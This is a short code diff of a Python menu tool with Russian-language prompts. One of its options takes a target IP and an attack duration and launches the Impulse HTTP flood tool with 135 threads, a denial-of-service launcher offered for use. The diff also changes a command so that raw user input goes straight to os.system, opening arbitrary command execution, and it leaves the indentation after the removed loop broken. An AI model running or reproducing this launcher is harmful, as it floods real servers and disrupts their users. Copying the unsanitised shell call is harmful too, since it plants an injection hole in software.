@@ -155,17 +155,13 @@ sa  - - afhe
         elif enter=='mb':
             print('вес системы voron составляет '+str(mb))
         elif enter=='sa':
-            try:
-                target=input('\nIP: ')
-                time_atack=input('время атаки в секундах: ')
-                os.system(r'python Impusle/impulse.py --method HTTP --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
-            except:
-                print('Ковальски, у нас ошибка.')
+            target=input('\nIP: ')
+            time_atack=input('время атаки в секундах: ')
+            os.system(r'python Impusle/impulse.py --method HTTP --target '+str(target)+' --time '+str(time_atack)+' --threads 135')
         else:
-            os.system('enter')
+            os.system(enter)
             print('\033[32m---------')
 #-5-inkor---
-    while True:
         enter()
 #try:
 a_1()
